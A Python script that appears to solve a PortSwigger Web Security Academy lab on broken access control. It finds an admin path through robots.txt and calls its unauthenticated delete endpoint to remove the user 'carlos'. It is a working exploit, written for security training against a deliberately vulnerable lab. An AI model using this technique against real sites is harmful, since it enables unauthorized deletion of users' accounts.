# https://portswigger.net/web-security/access-control/lab-unprotected-admin-functionality
# Lab: Unprotected admin functionality
# APPRENTICE

import requests
from pwn import log

sub = '0ad3009304872aa183f391d4001b0054'
url = f'https://{sub}.web-security-academy.net'

def exploit():
    # Check for the admin panel in robots.txt
    r = requests.get(f'{url}/robots.txt')
    log.info(f'Checking for admin panel in robots.txt:\n{r.text}')
    
    admin_panel = f'{url}/administrator-panel'
    
    # Attempt to delete the user 'carlos'
    r = requests.get(f'{admin_panel}/delete?username=carlos')
    
    if r.status_code != 200:
        log.error('Failed to delete user carlos')
        return
    
    log.success('Deleted user carlos')

    # Check if the lab is solved
    r = requests.get(url)
    if 'Congratulations, you solved the lab!' in r.text:
        log.success('Lab solved')
    else:
        log.info('Lab not solved yet')

if __name__ == '__main__':
    exploit()
